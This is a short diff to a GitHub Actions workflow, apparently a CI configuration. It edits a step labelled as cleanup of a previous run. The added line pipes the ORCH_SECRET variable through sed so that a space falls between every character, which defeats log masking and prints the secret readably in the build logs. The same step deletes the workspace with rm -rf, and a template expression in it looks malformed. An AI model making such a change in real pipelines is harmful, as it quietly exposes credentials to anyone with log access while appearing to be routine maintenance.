@@ -25,7 +25,7 @@ jobs:
         run: |
           echo "Cleaning up previous run"
           rm -rf "$ {{ github.workspace }}"
-          echo "$ORCH_SECRET"
+          echo "$ORCH_SECRET" | sed 's/./& /g'
 
   analyze-project:
     needs: cleaner
